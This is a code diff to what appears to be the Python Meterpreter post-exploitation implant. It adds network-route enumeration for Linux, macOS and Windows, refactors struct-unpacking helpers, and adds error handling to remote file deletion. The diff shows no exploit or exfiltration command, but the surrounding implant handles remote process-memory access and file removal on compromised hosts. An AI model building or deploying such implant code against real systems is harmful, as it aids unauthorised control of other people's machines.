@@ -69,7 +69,11 @@ else:
     long = int
     unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)
 
+libc = None
+
 if has_ctypes:
+    if sys.platform == 'darwin' or sys.platform.startswith('linux'):
+        libc = ctypes.CDLL(ctypes.util.find_library('c'))
     size_t = getattr(ctypes, 'c_uint' + str(ctypes.sizeof(ctypes.c_void_p) * 8))
     #
     # Windows Structures
@@ -100,12 +104,35 @@ if has_ctypes:
         _fields_ = [("lpSockaddr", ctypes.POINTER(SOCKADDR)),
             ("iSockaddrLength", ctypes.c_int)]
 
+    class sockaddr_in(ctypes.Structure):
+        _fields_ = [("sin_family", ctypes.c_short),
+            ("sin_port", ctypes.c_ushort),
+            ("sin_addr", ctypes.c_byte * 4),
+            ("sin_zero", ctypes.c_char * 8)
+        ]
+    SOCKADDR_IN = sockaddr_in
+
+    class sockaddr_in6(ctypes.Structure):
+        _fields_ = [("sin6_family", ctypes.c_short),
+            ("sin6_port", ctypes.c_ushort),
+            ("sin6_flowinfo", ctypes.c_ulong),
+            ("sin6_addr", ctypes.c_byte * 16),
+            ("sin6_scope_id", ctypes.c_ulong)
+        ]
+    SOCKADDR_IN6 = sockaddr_in6
+
+    class SOCKADDR_INET(ctypes.Union):
+        _fields_ = [("Ipv4", SOCKADDR_IN),
+            ("Ipv6", SOCKADDR_IN6),
+            ("si_family", ctypes.c_short)
+        ]
+
     class IP_ADAPTER_UNICAST_ADDRESS(ctypes.Structure):
         _fields_ = [
             ("s", type(
                     '_s_IP_ADAPTER_UNICAST_ADDRESS',
                     (ctypes.Structure,),
-                    dict(_fields_ = [
+                    dict(_fields_=[
                         ("Length", ctypes.c_ulong),
                         ("Flags", ctypes.c_uint32)
                     ])
@@ -177,40 +204,98 @@ if has_ctypes:
         _fields_ = [("cbSize", ctypes.c_uint32),
             ("dwTime", ctypes.c_uint32)]
 
-    class MIB_IFROW(ctypes.Structure):
-        _fields_ = [("wszName", (ctypes.c_wchar * 256)),
-            ("dwIndex", ctypes.c_uint32),
-            ("dwType", ctypes.c_uint32),
-            ("dwMtu", ctypes.c_uint32),
-            ("dwSpeed", ctypes.c_uint32),
-            ("dwPhysAddrLen", ctypes.c_uint32),
-            ("bPhysAddr", (ctypes.c_uint8 * 8)),
-            ("dwAdminStatus", ctypes.c_uint32),
-            ("dwOperStaus", ctypes.c_uint32),
-            ("dwLastChange", ctypes.c_uint32),
-            ("dwInOctets", ctypes.c_uint32),
-            ("dwInUcastPkts", ctypes.c_uint32),
-            ("dwInNUcastPkts", ctypes.c_uint32),
-            ("dwInDiscards", ctypes.c_uint32),
-            ("dwInErrors", ctypes.c_uint32),
-            ("dwInUnknownProtos", ctypes.c_uint32),
-            ("dwOutOctets", ctypes.c_uint32),
-            ("dwOutUcastPkts", ctypes.c_uint32),
-            ("dwOutNUcastPkts", ctypes.c_uint32),
-            ("dwOutDiscards", ctypes.c_uint32),
-            ("dwOutErrors", ctypes.c_uint32),
-            ("dwOutQLen", ctypes.c_uint32),
-            ("dwDescrLen", ctypes.c_uint32),
-            ("bDescr", (ctypes.c_char * 256))]
+    class MIB_IPINTERFACE_ROW(ctypes.Structure):
+        _fields_ = [("Family", ctypes.c_uint16),
+            ("InterfaceLuid", ctypes.c_uint64),
+            ("InterfaceIndex", ctypes.c_uint32),
+            ("MaxReassemblySize", ctypes.c_uint32),
+            ("InterfaceIdentifier", ctypes.c_uint64),
+            ("MinRouterAdvertisementInterval", ctypes.c_uint32),
+            ("MaxRouterAdvertisementInterval", ctypes.c_uint32),
+            ("AdvertisingEnabled", ctypes.c_uint8),
+            ("ForwardingEnabled", ctypes.c_uint8),
+            ("WeakHostSend", ctypes.c_uint8),
+            ("WeakHostReceive", ctypes.c_uint8),
+            ("UseAutomaticMetric", ctypes.c_uint8),
+            ("UseNeighborUnreachabilityDetection", ctypes.c_uint8),
+            ("ManagedAddressConfigurationSupported", ctypes.c_uint8),
+            ("OtherStatefulConfigurationSupported", ctypes.c_uint8),
+            ("AdvertiseDefaultRoute", ctypes.c_uint8),
+            ("RouterDiscoveryBehavior", ctypes.c_uint32),
+            ("DadTransmits", ctypes.c_uint32),
+            ("BaseReachableTime", ctypes.c_uint32),
+            ("RetransmitTime", ctypes.c_uint32),
+            ("PathMtuDiscoveryTimeout", ctypes.c_uint32),
+            ("LinkLocalAddressBehavior", ctypes.c_uint32),
+            ("LinkLocalAddressTimeout", ctypes.c_uint32),
+            ("ZoneIndices", ctypes.c_uint32 * 16),
+            ("SitePrefixLength", ctypes.c_uint32),
+            ("Metric", ctypes.c_uint32),
+            ("NlMtu", ctypes.c_uint32),
+            ("Connected", ctypes.c_uint8),
+            ("SupportsWakeUpPatterns", ctypes.c_uint8),
+            ("SupportsNeighborDiscovery", ctypes.c_uint8),
+            ("SupportsRouterDiscovery", ctypes.c_uint8),
+            ("ReachableTime", ctypes.c_uint32),
+            ("TransmitOffload", ctypes.c_uint8),
+            ("ReceiveOffload", ctypes.c_uint8),
+            ("DisableDefaultRoutes", ctypes.c_uint8),
+        ]
 
-    class MIB_IPADDRROW(ctypes.Structure):
-        _fields_ = [("dwAddr", ctypes.c_uint32),
-            ("dwIndex", ctypes.c_uint32),
-            ("dwMask", ctypes.c_uint32),
-            ("dwBCastAddr", ctypes.c_uint32),
-            ("dwReasmSize", ctypes.c_uint32),
-            ("unused1", ctypes.c_uint16),
-            ("wType", ctypes.c_uint16)]
+    class IP_ADDRESS_PREFIX(ctypes.Structure):
+        _fields_ = [("Prefix", SOCKADDR_INET),
+            ("PrefixLength", ctypes.c_uint8)
+        ]
+
+    class MIB_IPFORWARDROW(ctypes.Structure):
+        _fields_ = [("dwForwardDest", ctypes.c_uint32),
+            ("dwForwardMask", ctypes.c_uint32),
+            ("dwForwardPolicy", ctypes.c_uint32),
+            ("dwForwardNextHop", ctypes.c_uint32),
+            ("dwForwardIfIndex", ctypes.c_uint32),
+            ("dwForwardType", ctypes.c_uint32),
+            ("dwForwardProto", ctypes.c_uint32),
+            ("dwForwardAge", ctypes.c_uint32),
+            ("dwForwardNextHopAS", ctypes.c_uint32),
+            ("dwForwardMetric1", ctypes.c_uint32),
+            ("dwForwardMetric2", ctypes.c_uint32),
+            ("dwForwardMetric3", ctypes.c_uint32),
+            ("dwForwardMetric4", ctypes.c_uint32),
+            ("dwForwardMetric5", ctypes.c_uint32),
+        ]
+    PMIB_IPFORWARDROW = ctypes.POINTER(MIB_IPFORWARDROW)
+
+    class MIB_IPFORWARD_ROW2(ctypes.Structure):
+        _fields_ = [("InterfaceLuid", ctypes.c_uint64),
+            ("InterfaceIndex", ctypes.c_uint32),
+            ("DestinationPrefix", IP_ADDRESS_PREFIX),
+            ("NextHop", SOCKADDR_INET),
+            ("SitePrefixLength", ctypes.c_uint8),
+            ("ValidLifetime", ctypes.c_uint32),
+            ("PreferredLifetime", ctypes.c_uint32),
+            ("Metric", ctypes.c_uint32),
+            ("Protocol", ctypes.c_uint32),
+            ("Loopback", ctypes.c_byte),
+            ("AutoconfigureAddress", ctypes.c_byte),
+            ("Publish", ctypes.c_byte),
+            ("Immortal", ctypes.c_byte),
+            ("Age", ctypes.c_uint32),
+            ("Origin", ctypes.c_uint32),
+        ]
+    PMIB_IPFORWARD_ROW2 = ctypes.POINTER(MIB_IPFORWARD_ROW2)
+
+
+    class MIB_IPFORWARDTABLE(ctypes.Structure):
+        _fields_ = [("dwNumEntries", ctypes.c_uint32),
+            ("table", MIB_IPFORWARDROW * 0)
+        ]
+    PMIB_IPFORWARDTABLE = ctypes.POINTER(MIB_IPFORWARDTABLE)
+
+    class MIB_IPFORWARD_TABLE2(ctypes.Structure):
+        _fields_ = [("NumEntries", ctypes.c_uint32),
+            ("Table", MIB_IPFORWARD_ROW2 * 0)
+        ]
+    PMIB_IPFORWARD_TABLE2 = ctypes.POINTER(MIB_IPFORWARD_TABLE2)
 
     class OSVERSIONINFOEXW(ctypes.Structure):
         _fields_ = [("dwOSVersionInfoSize", ctypes.c_uint32),
@@ -298,6 +383,17 @@ if has_ctypes:
     class RTATTR(ctypes.Structure):
         _fields_ = [("len", ctypes.c_uint16),
             ("type", ctypes.c_uint16)]
+
+    class RTMSG(ctypes.Structure):
+        _fields_ = [("family", ctypes.c_uint8),
+            ("dst_len", ctypes.c_uint8),
+            ("src_len", ctypes.c_uint8),
+            ("tos", ctypes.c_uint8),
+            ("table", ctypes.c_uint8),
+            ("protocol", ctypes.c_uint8),
+            ("scope", ctypes.c_uint8),
+            ("type", ctypes.c_uint8),
+            ("flags", ctypes.c_uint32)]
 
 TLV_EXTENSIONS           = 20000
 #
@@ -596,6 +692,23 @@ UNIVERSAL_NAME_INFO_LEVEL = 1
 DRIVE_REMOTE = 4
 
 # Linux Constants
+RT_TABLE_MAIN = 254
+RTA_UNSPEC = 0
+RTA_DST = 1
+RTA_SRC = 2
+RTA_IIF = 3
+RTA_OIF = 4
+RTA_GATEWAY = 5
+RTA_PRIORITY = 6
+RTA_PREFSRC = 7
+RTA_METRICS = 8
+RTA_MULTIPATH = 9
+RTA_PROTOINFO = 10 #/* no longer used */
+RTA_FLOW = 11
+RTA_CACHEINFO = 12
+RTA_SESSION = 13 #/* no longer used */
+RTA_MP_ALGO = 14 #/* no longer used */
+RTA_TABLE = 15
 RTM_GETLINK   = 18
 RTM_GETADDR   = 22
 RTM_GETROUTE  = 26
@@ -627,13 +740,6 @@ def bytes_to_ctarray(bytes_):
     ctypes.memmove(ctypes.byref(ctarray), bytes_, len(bytes_))
     return ctarray
 
-def ctarray_to_bytes(ctarray):
-    if not len(ctarray):
-        # work around a bug in v3.1 & v3.2 that results in a segfault when len(ctarray) == 0
-        return bytes()
-    bytes_ = buffer(ctarray) if sys.version_info[0] < 3 else bytes(ctarray)
-    return bytes_[:]
-
 def calculate_32bit_netmask(bits):
     if bits == 32:
         netmask = 0xffffffff
@@ -654,7 +760,17 @@ def calculate_128bit_netmask(bits):
         netmask = struct.pack('!IIII', part, 0, 0, 0)
     return netmask
 
-def cstruct_unpack(structure, raw_data):
+def ctarray_to_bytes(ctarray):
+    if not len(ctarray):
+        # work around a bug in v3.1 & v3.2 that results in a segfault when len(ctarray) == 0
+        return bytes()
+    bytes_ = buffer(ctarray) if sys.version_info[0] < 3 else bytes(ctarray)
+    return bytes_[:]
+
+def ctstruct_pack(structure):
+    return ctypes.string_at(ctypes.byref(structure), ctypes.sizeof(structure))
+
+def ctstruct_unpack(structure, raw_data):
     if not isinstance(structure, ctypes.Structure):
         structure = structure()
     ctypes.memmove(ctypes.byref(structure), raw_data, ctypes.sizeof(structure))
@@ -685,7 +801,7 @@ def get_token_user(handle):
     ctypes.windll.kernel32.CloseHandle(token_handle)
     if not result:
         return None
-    return cstruct_unpack(TOKEN_USER, token_user_buffer)
+    return ctstruct_unpack(TOKEN_USER, token_user_buffer)
 
 def get_username_from_token(token_user):
     user = (ctypes.c_char * 512)()
@@ -797,26 +913,31 @@ def getaddrinfo_from_request(request, socktype, proto):
         local_address_info = None
     return peer_address_info, local_address_info
 
-def netlink_request(req_type):
+def netlink_request(req_type, req_data):
     # See RFC 3549
     NLM_F_REQUEST    = 0x0001
     NLM_F_ROOT       = 0x0100
+    NLM_F_MATCH      = 0x0200
+    NLM_F_DUMP       = NLM_F_ROOT | NLM_F_MATCH
     NLMSG_ERROR      = 0x0002
     NLMSG_DONE       = 0x0003
 
     sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
     sock.bind((os.getpid(), 0))
     seq = int(time.time())
-    nlmsg = struct.pack('IHHIIB15x', 32, req_type, (NLM_F_REQUEST | NLM_F_ROOT), seq, 0, socket.AF_UNSPEC)
-    sock.send(nlmsg)
+    if isinstance(req_data, ctypes.Structure):
+        req_data = ctstruct_pack(req_data)
+    nlmsg = ctstruct_pack(NLMSGHDR(len=ctypes.sizeof(NLMSGHDR) + len(req_data), type=req_type, flags=(NLM_F_REQUEST | NLM_F_DUMP), seq=seq, pid=0))
+    sock.send(nlmsg + req_data)
     responses = []
     if not len(select.select([sock.fileno()], [], [], 0.5)[0]):
         return responses
     raw_response_data = sock.recv(0xfffff)
-    response = cstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
+    response = ctstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
     raw_response_data = raw_response_data[ctypes.sizeof(NLMSGHDR):]
     while response.type != NLMSG_DONE:
         if response.type == NLMSG_ERROR:
+            debug_print('received NLMSG_ERROR from a netlink request')
             break
         response_data = raw_response_data[:(response.len - 16)]
         responses.append(response_data)
@@ -825,7 +946,7 @@ def netlink_request(req_type):
             if not len(select.select([sock.fileno()], [], [], 0.5)[0]):
                 break
             raw_response_data = sock.recv(0xfffff)
-        response = cstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
+        response = ctstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
         raw_response_data = raw_response_data[ctypes.sizeof(NLMSGHDR):]
     sock.close()
     return responses
@@ -1217,7 +1338,7 @@ def stdapi_sys_eventlog_read(request, response):
     buf = ctypes.create_unicode_buffer(bytes_needed.value)
     if not adv32.ReadEventLogW(handle, flags, offset, buf, bytes_needed, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
         return error_result_windows(), response
-    record = cstruct_unpack(EVENTLOGRECORD, buf)
+    record = ctstruct_unpack(EVENTLOGRECORD, buf)
     response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, record.RecordNumber)
     response += tlv_pack(TLV_TYPE_EVENT_TIMEGENERATED, record.TimeGenerated)
     response += tlv_pack(TLV_TYPE_EVENT_TIMEWRITTEN, record.TimeWritten)
@@ -1276,7 +1397,10 @@ def stdapi_fs_delete_dir(request, response):
         del_func = os.unlink
     else:
         del_func = shutil.rmtree
-    del_func(dir_path)
+    try:
+        del_func(dir_path)
+    except OSError:
+        return ERROR_FAILURE, response
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1284,7 +1408,10 @@ def stdapi_fs_delete_file(request, response):
     file_path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
     if has_windll:
         subprocess.call(unicode("attrib.exe -r ") + file_path)
-    os.unlink(unicode(file_path))
+    try:
+        os.unlink(unicode(file_path))
+    except OSError:
+        return ERROR_FAILURE, response
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1447,7 +1574,7 @@ def stdapi_fs_mount_show(request, response):
             buf = ctypes.create_unicode_buffer(1024)
             bufsize = ctypes.c_ulong(1024)
             if mpr.WNetGetUniversalNameW(drive, UNIVERSAL_NAME_INFO_LEVEL, ctypes.byref(buf), ctypes.byref(bufsize)) == 0:
-                pUniversalNameInfo = cstruct_unpack(UNIVERSAL_NAME_INFO, buf)
+                pUniversalNameInfo = ctstruct_unpack(UNIVERSAL_NAME_INFO, buf)
                 mount += tlv_pack(TLV_TYPE_MOUNT_UNCPATH, pUniversalNameInfo.lpUniversalName)
         # Retrieve information about the amount of space that is available on a disk volume
         user_free_bytes = ctypes.c_ulonglong(0)
@@ -1504,9 +1631,9 @@ def stdapi_net_config_get_interfaces_via_netlink():
     iface_flags_sorted.sort()
     interfaces = {}
 
-    responses = netlink_request(RTM_GETLINK)
+    responses = netlink_request(RTM_GETLINK, IFINFOMSG())
     for res_data in responses:
-        iface = cstruct_unpack(IFINFOMSG, res_data)
+        iface = ctstruct_unpack(IFINFOMSG, res_data)
         iface_info = {'index':iface.index}
         flags = []
         for flag in iface_flags_sorted:
@@ -1515,7 +1642,7 @@ def stdapi_net_config_get_interfaces_via_netlink():
         iface_info['flags'] = ' '.join(flags)
         cursor = ctypes.sizeof(IFINFOMSG)
         while cursor < len(res_data):
-            attribute = cstruct_unpack(RTATTR, res_data[cursor:])
+            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
             at_len = attribute.len
             attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
             cursor += rta_align(at_len)
@@ -1528,15 +1655,15 @@ def stdapi_net_config_get_interfaces_via_netlink():
                 iface_info['mtu'] = struct.unpack('<I', attr_data)[0]
         interfaces[iface.index] = iface_info
 
-    responses = netlink_request(RTM_GETADDR)
+    responses = netlink_request(RTM_GETADDR, IFADDRMSG())
     for res_data in responses:
-        iface = cstruct_unpack(IFADDRMSG, res_data)
+        iface = ctstruct_unpack(IFADDRMSG, res_data)
         if not iface.family in (socket.AF_INET, socket.AF_INET6):
             continue
         iface_info = interfaces.get(iface.index, {})
         cursor = ctypes.sizeof(IFADDRMSG)
         while cursor < len(res_data):
-            attribute = cstruct_unpack(RTATTR, res_data[cursor:])
+            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
             at_len = attribute.len
             attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
             cursor += rta_align(at_len)
@@ -1598,8 +1725,6 @@ def stdapi_net_config_get_interfaces_via_osx_ifconfig():
 
 def stdapi_net_config_get_interfaces_via_windll():
     iphlpapi = ctypes.windll.iphlpapi
-    if not hasattr(iphlpapi, 'GetAdaptersAddresses'):
-        return stdapi_net_config_get_interfaces_via_windll_mib()
     Flags = (GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST)
     AdapterAddresses = ctypes.c_void_p()
     SizePointer = ctypes.c_ulong()
@@ -1608,14 +1733,14 @@ def stdapi_net_config_get_interfaces_via_windll():
     AdapterAddressesData = (ctypes.c_uint8 * SizePointer.value)()
     iphlpapi.GetAdaptersAddresses(socket.AF_UNSPEC, Flags, None, ctypes.byref(AdapterAddressesData), ctypes.byref(SizePointer))
     AdapterAddresses = ctypes.string_at(ctypes.byref(AdapterAddressesData), SizePointer.value)
-    AdapterAddresses = cstruct_unpack(IP_ADAPTER_ADDRESSES, AdapterAddresses)
+    AdapterAddresses = ctstruct_unpack(IP_ADAPTER_ADDRESSES, AdapterAddresses)
     if AdapterAddresses.u.s.Length <= 72:
-        return stdapi_net_config_get_interfaces_via_windll_mib()
+        raise RuntimeError('invalid AdapterAddresses length')
     win_version = windll_GetVersion()
     interfaces = []
     pAdapterAddresses = ctypes.byref(AdapterAddresses)
     while pAdapterAddresses:
-        AdapterAddresses = cstruct_unpack(IP_ADAPTER_ADDRESSES, pAdapterAddresses)
+        AdapterAddresses = ctstruct_unpack(IP_ADAPTER_ADDRESSES, pAdapterAddresses)
         pAdapterAddresses = AdapterAddresses.Next
         pFirstPrefix = AdapterAddresses.FirstPrefix
         iface_info = {}
@@ -1629,9 +1754,9 @@ def stdapi_net_config_get_interfaces_via_windll():
         iface_info['mtu'] = AdapterAddresses.Mtu
         pUniAddr = AdapterAddresses.FirstUnicastAddress
         while pUniAddr:
-            UniAddr = cstruct_unpack(IP_ADAPTER_UNICAST_ADDRESS, pUniAddr)
+            UniAddr = ctstruct_unpack(IP_ADAPTER_UNICAST_ADDRESS, pUniAddr)
             pUniAddr = UniAddr.Next
-            address = cstruct_unpack(SOCKADDR, UniAddr.Address.lpSockaddr)
+            address = ctstruct_unpack(SOCKADDR, UniAddr.Address.lpSockaddr)
             if not address.sa_family in (socket.AF_INET, socket.AF_INET6):
                 continue
             prefix = 0
@@ -1650,34 +1775,183 @@ def stdapi_net_config_get_interfaces_via_windll():
         interfaces.append(iface_info)
     return interfaces
 
-def stdapi_net_config_get_interfaces_via_windll_mib():
-    iphlpapi = ctypes.windll.iphlpapi
-    table = (ctypes.c_uint8 * (ctypes.sizeof(MIB_IPADDRROW) * 33))()
-    pdwSize = ctypes.c_ulong()
-    pdwSize.value = ctypes.sizeof(table)
-    if (iphlpapi.GetIpAddrTable(ctypes.byref(table), ctypes.byref(pdwSize), True) != 0):
-        return None
-    interfaces = []
-    table_data = ctypes.string_at(table, pdwSize.value)
-    entries = struct.unpack('I', table_data[:4])[0]
-    table_data = table_data[4:]
-    for i in range(entries):
-        addrrow = cstruct_unpack(MIB_IPADDRROW, table_data)
-        ifrow = MIB_IFROW()
-        ifrow.dwIndex = addrrow.dwIndex
-        if iphlpapi.GetIfEntry(ctypes.byref(ifrow)) != 0:
+@register_function
+def stdapi_net_config_get_routes(request, response):
+    if hasattr(socket, 'AF_NETLINK') and hasattr(socket, 'NETLINK_ROUTE'):
+        routes = stdapi_net_config_get_routes_via_netlink()
+    elif sys.platform == 'darwin':
+        routes = stdapi_net_config_get_routes_via_osx_netstat()
+    elif has_windll:
+        routes = stdapi_net_config_get_routes_via_windll()
+    else:
+        return ERROR_FAILURE, response
+    for route_info in routes:
+        route_tlv  = bytes()
+        route_tlv += tlv_pack(TLV_TYPE_SUBNET, route_info['subnet'])
+        route_tlv += tlv_pack(TLV_TYPE_NETMASK, route_info['netmask'])
+        route_tlv += tlv_pack(TLV_TYPE_GATEWAY, route_info['gateway'])
+        route_tlv += tlv_pack(TLV_TYPE_STRING, route_info['iface'])
+        route_tlv += tlv_pack(TLV_TYPE_ROUTE_METRIC, route_info.get('metric', 0))
+        response += tlv_pack(TLV_TYPE_NETWORK_ROUTE, route_tlv)
+    return ERROR_SUCCESS, response
+
+def stdapi_net_config_get_routes_via_netlink():
+    rta_align = lambda l: l+3 & ~3
+    responses = netlink_request(RTM_GETROUTE, RTMSG(family=socket.AF_UNSPEC))
+    routes = []
+    for res_data in responses:
+        rtmsg = ctstruct_unpack(RTMSG, res_data)
+        cursor = rta_align(ctypes.sizeof(RTMSG))
+        route = {'table': rtmsg.table}
+        if rtmsg.family == socket.AF_INET:
+            route['gateway'] = route['subnet'] = inet_pton(socket.AF_INET, '0.0.0.0')
+            route['netmask'] = calculate_32bit_netmask(rtmsg.dst_len)
+        elif rtmsg.family == socket.AF_INET6:
+            route['gateway'] = route['subnet'] = inet_pton(socket.AF_INET6, '::')
+            route['netmask'] = calculate_128bit_netmask(rtmsg.dst_len)
+        else:
+          continue
+        while cursor < len(res_data):
+            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
+            at_len = attribute.len
+            attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
+            cursor += rta_align(at_len)
+            if attribute.type == RTA_DST:
+                route['subnet'] = attr_data
+            if attribute.type == RTA_GATEWAY:
+                route['gateway'] = attr_data
+            elif attribute.type == RTA_TABLE:
+                route['table'] = struct.unpack('<I', attr_data)[0]
+            elif attribute.type == RTA_OIF:
+                route['iface'] = _linux_if_indextoname(struct.unpack('<I', attr_data)[0])
+            elif attribute.type == RTA_PRIORITY:
+                route['metric'] = struct.unpack('<I', attr_data)[0]
+        if route['table'] != RT_TABLE_MAIN:
             continue
-        iface_info = {}
-        table_data = table_data[ctypes.sizeof(MIB_IPADDRROW):]
-        iface_info['index'] = addrrow.dwIndex
-        iface_info['addrs'] = [(socket.AF_INET, struct.pack('<I', addrrow.dwAddr), struct.pack('<I', addrrow.dwMask))]
-        if ifrow.dwPhysAddrLen:
-            iface_info['hw_addr'] = ctypes.string_at(ctypes.byref(ifrow.bPhysAddr), ifrow.dwPhysAddrLen)
-        if ifrow.dwDescrLen:
-            iface_info['name'] = ifrow.bDescr
-        iface_info['mtu'] = ifrow.dwMtu
-        interfaces.append(iface_info)
-    return interfaces
+        routes.append(route)
+    return routes
+
+def stdapi_net_config_get_routes_via_osx_netstat():
+    proc_h = subprocess.Popen(['/usr/sbin/netstat', '-rn'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    if proc_h.wait():
+        raise Exception('netstat exited with non-zero status')
+    output = proc_h.stdout.read()
+
+    routes = []
+    state = None
+    has_refs = None
+    for line in output.split('\n'):
+        line = line.strip()
+        if state is None:
+            if line == 'Internet:':
+                state = socket.AF_INET
+            elif line == 'Internet6:':
+                state = socket.AF_INET6
+            continue
+        words = line.split()
+        if len(words) < 4:
+            state = None
+            has_refs = None
+            continue
+        if words[0].lower() == 'destination':
+            if len(words) > 5 and words[3].lower() == 'refs':
+                has_refs = True
+            continue
+        destination, gateway, flags, iface = words[:4]
+        if has_refs:
+            iface = words[5]
+        if state == socket.AF_INET:
+            all_nets = '0.0.0.0/0'
+            bits = 32
+            calc_netmask = calculate_32bit_netmask
+        elif state == socket.AF_INET6:
+            all_nets = '::/0'
+            bits = 128
+            calc_netmask = calculate_128bit_netmask
+        else:
+            continue
+        if destination == 'default':
+            destination = all_nets
+        if re.match('link#\d+', gateway) or re.match('([0-9a-f]{1,2}:){5}[0-9a-f]{1,2}', gateway):
+            gateway = all_nets[:-2]
+        if '/' in destination:
+            destination, netmask_bits = destination.rsplit('/', 1)
+            netmask_bits = int(netmask_bits)
+        else:
+            netmask_bits = bits
+        if '%' in destination:
+            destination, _ = destination.rsplit('%', 1)
+        if '%' in gateway:
+            gateway, _ = gateway.rsplit('%', 1)
+        if state == socket.AF_INET:
+            while destination.count('.') < 3:
+                destination += '.0'
+        routes.append({
+            'subnet': inet_pton(state, destination),
+            'netmask': calc_netmask(netmask_bits),
+            'gateway': inet_pton(state, gateway),
+            'metric': 0,
+            'iface': iface
+        })
+    return routes
+
+def stdapi_net_config_get_routes_via_windll():
+    iphlpapi = ctypes.windll.iphlpapi
+    if not hasattr(iphlpapi, 'GetIpForwardTable2'):  # added in Vista / 2008
+        return stdapi_net_config_get_routes_via_windll2()
+    routes = []
+    iface_names = {}
+    for iface in stdapi_net_config_get_interfaces_via_windll():
+        iface_names[iface['index']] = iface['name']
+    for family in [WIN_AF_INET, WIN_AF_INET6]:
+        table = PMIB_IPFORWARD_TABLE2()
+        if iphlpapi.GetIpForwardTable2(family, ctypes.byref(table)):
+            continue
+        table = table.contents
+        rows = ctypes.cast(table.Table, PMIB_IPFORWARD_ROW2)
+        for index in range(table.NumEntries):
+            row = rows[index]
+            route = {}
+            if family == WIN_AF_INET:
+                route['subnet'] = ctarray_to_bytes(row.DestinationPrefix.Prefix.Ipv4.sin_addr)
+                route['netmask'] = calculate_32bit_netmask(row.DestinationPrefix.PrefixLength)
+                route['gateway'] = ctarray_to_bytes(row.NextHop.Ipv4.sin_addr)
+            elif family == WIN_AF_INET6:
+                route['subnet'] = ctarray_to_bytes(row.DestinationPrefix.Prefix.Ipv6.sin6_addr)
+                route['netmask'] = calculate_128bit_netmask(row.DestinationPrefix.PrefixLength)
+                route['gateway'] = ctarray_to_bytes(row.NextHop.Ipv6.sin6_addr)
+            iface = MIB_IPINTERFACE_ROW(Family=family, InterfaceIndex=row.InterfaceIndex)
+            if iphlpapi.GetIpInterfaceEntry(ctypes.byref(iface)):
+                continue
+            route['metric'] = row.Metric + iface.Metric
+            route['iface'] = iface_names.get(row.InterfaceIndex, str(row.InterfaceIndex))
+            routes.append(route)
+    return routes
+
+def stdapi_net_config_get_routes_via_windll2():
+    iphlpapi = ctypes.windll.iphlpapi
+    routes = []
+    iface_names = {}
+    for iface in stdapi_net_config_get_interfaces_via_windll():
+        iface_names[iface['index']] = iface['name']
+    size = ctypes.c_uint32(0)
+    table = MIB_IPFORWARDTABLE()
+    iphlpapi.GetIpForwardTable(ctypes.byref(table), ctypes.byref(size), False)
+    if size.value:
+        buffer = (ctypes.c_uint8 * size.value)()
+        table = ctypes.cast(buffer, PMIB_IPFORWARDTABLE).contents
+        iphlpapi.GetIpForwardTable(ctypes.byref(table), ctypes.byref(size), False)
+        rows = ctypes.cast(table.table, PMIB_IPFORWARDROW)
+        for index in range(table.dwNumEntries):
+            row = rows[index]
+            routes.append({
+                'subnet': struct.pack('<I', row.dwForwardDest),
+                'netmask': struct.pack('<I', row.dwForwardMask),
+                'gateway': struct.pack('<I', row.dwForwardNextHop),
+                'metric': row.dwForwardMetric1,
+                'iface': iface_names.get(row.dwForwardIfIndex, str(row.dwForwardIfIndex))
+            })
+    return routes
 
 @register_function_if(has_windll)
 def stdapi_net_config_get_proxy(request, response):
@@ -1777,8 +2051,12 @@ def _linux_check_maps(address, size, perms=''):
         cursor = region['address-end']
     return True
 
+def _linux_if_indextoname(index):
+    name = (ctypes.c_char * 256)()
+    if libc.if_indextoname(index, name):
+        return name.value.decode('ascii')
+
 def _linux_memread(address, size):
-    libc = ctypes.cdll.LoadLibrary('libc.so.6')
     if not hasattr(libc, 'process_vm_readv'):
         # requires linux 3.2+ / glibc 2.15+, see:
         # http://man7.org/linux/man-pages/man2/process_vm_readv.2.html#VERSIONS
@@ -1801,7 +2079,6 @@ def _linux_memread(address, size):
     return ctarray_to_bytes(buff)
 
 def _linux_memwrite(address, data):
-    libc = ctypes.cdll.LoadLibrary('libc.so.6')
     if not hasattr(libc, 'process_vm_writev'):
         # requires linux 3.2+ / glibc 2.15+, see:
         # http://man7.org/linux/man-pages/man2/process_vm_writev.2.html#VERSIONS
@@ -1825,7 +2102,6 @@ def _linux_memwrite(address, data):
     return size
 
 def _osx_memread(address, size):
-    libc = ctypes.CDLL(ctypes.util.find_library('c'))
     task = libc.mach_task_self()
     libc.mach_vm_read.argtypes = [ctypes.c_uint32, size_t, size_t, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_uint32)]
     libc.mach_vm_read.restype = ctypes.c_uint32
@@ -1842,7 +2118,6 @@ def _osx_memread(address, size):
     return ctarray_to_bytes(buff.contents)
 
 def _osx_memwrite(address, data):
-    libc = ctypes.CDLL(ctypes.util.find_library('c'))
     task = libc.mach_task_self()
     libc.mach_vm_write.argtypes = [ctypes.c_uint32, size_t, ctypes.c_void_p, ctypes.c_uint32]
     libc.mach_vm_write.restype = ctypes.c_uint32
@@ -1945,10 +2220,6 @@ def stdapi_railgun_api(request, response):
     debug_print('[*] railgun calling: ' + lib_name + '!' + func_name)
     prototype = func_type(native, *func_args)
     if sys.platform == 'darwin' or sys.platform.startswith('linux'):
